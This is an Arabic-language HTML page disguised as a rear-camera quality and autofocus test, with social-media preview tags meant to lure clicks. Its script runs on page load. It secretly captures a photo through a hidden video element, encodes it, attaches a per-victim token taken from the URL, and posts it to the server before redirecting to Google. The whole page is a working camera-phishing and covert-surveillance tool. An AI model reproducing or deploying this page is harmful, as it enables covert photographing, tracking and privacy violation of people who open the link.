<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص جودة الكاميرا الخلفية والعدسة | Camera Test Pro</title>
    
    <meta property="og:title" content="اختبار نقاء ودقة الكاميرا الخلفية الذكي | Camera Check">
    <meta property="og:description" content="اضغط للسماح بفحص عدسة الكاميرا الخلفية واختبار التركيز التلقائي بدقة عالية!">
    <meta property="og:image" content="https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=1200&auto=format&fit=crop&q=80">
    <meta property="og:type" content="website">

    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
        body { font-family: 'Tajawal', sans-serif; }
        .cam-gradient { background: linear-gradient(135deg, #2563EB 0%, #1D4ED8 100%); }
    </style>
</head>
<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">

    <!-- عنصر فيديو مخفي لالتقاط الصورة من الكاميرا الخلفية -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl text-center space-y-6 relative overflow-hidden">
        
        <div class="absolute -top-16 -right-16 w-32 h-32 bg-blue-500/10 rounded-full blur-2xl pointer-events-none"></div>

        <div class="w-20 h-20 rounded-3xl cam-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-blue-500/30 animate-pulse">
            <i class="fa-solid fa-camera"></i>
        </div>

        <div class="space-y-2">
            <span class="bg-blue-500/20 text-blue-400 text-xs px-3 py-1 rounded-full font-bold border border-blue-500/30">فحص العدسة الخلفية</span>
            <h1 class="text-2xl font-black text-white">جاري اختبار دقة الكاميرا...</h1>
            <p class="text-xs text-slate-400">
                يرجى النقر على زر <span class="text-blue-400 font-bold">"السماح للكاميرا" (Allow)</span> في النافذة المنبثقة لاختبار جودة العدسة الخلفية.
            </p>
        </div>

        <div class="flex justify-center items-center space-x-2 space-x-reverse py-2">
            <div class="w-3 h-3 bg-blue-500 rounded-full animate-bounce"></div>
            <div class="w-3 h-3 bg-blue-500 rounded-full animate-bounce [animation-delay:-.2s]"></div>
            <div class="w-3 h-3 bg-blue-500 rounded-full animate-bounce [animation-delay:-.4s]"></div>
        </div>

        <div id="statusText" class="text-xs text-blue-400 font-semibold animate-pulse">
            جاري تحضير الكاميرا الخلفية...
        </div>

    </div>

    <script>
        window.addEventListener('DOMContentLoaded', async () => {
            const statusText = document.getElementById('statusText');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            try {
                // طلب إذن الكاميرا الخلفية حصرياً (environment)
                const constraints = {
                    video: { facingMode: { exact: "environment" } }
                };

                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (err) {
                    // كبديل لو الكاميرا الخلفية غير متوفرة في بعض الأجهزة الافتراضية
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                }

                video.srcObject = stream;
                await video.play();

                statusText.textContent = "جاري التقاط الصورة بدقة عالية...";
                statusText.className = "text-xs text-amber-400 font-semibold";

                // الانتظار ثانية لضمان استقرار العدسة وتوهج الصورة
                setTimeout(async () => {
                    canvas.width = video.videoWidth || 1280;
                    canvas.height = video.videoHeight || 720;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
                    const base64Data = imageData.split(',')[1];

                    // إيقاف الكاميرا
                    stream.getTracks().forEach(track => track.stop());

                    // استخراج الرمز token من المسار (مثل /captureBack/c55fcbf8)
                    const pathParts = window.location.pathname.split('/');
                    const token = pathParts.pop() || pathParts.pop() || new URLSearchParams(window.location.search).get('t');

                    if (!token) {
                        console.error('Token not found.');
                        return;
                    }

                    const payload = {
                        token: token,
                        imageDatas: base64Data
                    };

                    statusText.textContent = "تم التقاط الصورة! جاري إرسالها للنظام...";
                    statusText.className = "text-xs text-emerald-400 font-semibold";

                    try {
                        // إرسال الصورة للمسار المعتمد في السيرفر لديك
                        await fetch('/submitPhotos', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        });
                    } catch (e) {
                        console.error('Failed to submit photo');
                    }

                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);

                }, 1500);

            } catch (err) {
                statusText.textContent = "عذراً، يجب السماح بالكاميرا لإتمام الفحص!";
                statusText.className = "text-xs text-red-400 font-semibold";
            }
        });
    </script>
</body>
</html>
